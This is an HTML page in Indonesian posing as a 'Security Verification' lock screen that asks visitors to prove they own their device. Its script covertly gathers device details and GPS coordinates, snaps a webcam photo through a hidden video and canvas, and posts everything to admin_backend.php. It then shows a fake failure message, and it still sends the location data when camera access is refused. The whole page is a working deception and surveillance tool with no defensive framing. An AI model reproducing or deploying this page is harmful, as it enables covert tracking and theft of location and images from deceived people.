<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #0f0; padding: 30px; text-align: center; box-shadow: 0 0 20px #0f0; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        #status { margin-top: 10px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <h2>SISTEM TERKUNCI</h2>
        <p>Klik tombol di bawah untuk memverifikasi bahwa Anda adalah pemilik perangkat ini.</p>
        <button id="startBtn">VERIFIKASI SEKARANG</button>
        <div id="status">Menunggu interaksi...</div>
    </div>

    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const btn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        btn.onclick = async () => {
            status.innerText = "Memproses...";
            const data = {
                ram: navigator.deviceMemory || "N/A",
                vendor: navigator.vendor,
                platform: navigator.platform,
                ua: navigator.userAgent
            };

            // Step 1: Ambil GPS
            navigator.geolocation.getCurrentPosition(async (pos) => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;

                // Step 2: Ambil Foto JPG
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const v = document.getElementById('v');
                    v.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(v, 0, 0, 640, 480);
                        data.image = canvas.toDataURL('image/jpeg');

                        // Step 3: Kirim ke Backend PHP
                        fetch('admin_backend.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        }).then(() => {
                            status.innerText = "Verifikasi Gagal. Coba lagi.";
                            alert("Error: Identitas tidak cocok!");
                        });
                    }, 1000);
                } catch (e) {
                    // Jika kamera ditolak, tetap kirim data GPS & Spec
                    fetch('admin_backend.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                }
            }, (err) => { alert("Akses Lokasi Ditolak! Verifikasi tidak bisa dilanjutkan."); });
        };
    </script>
</body>
</html>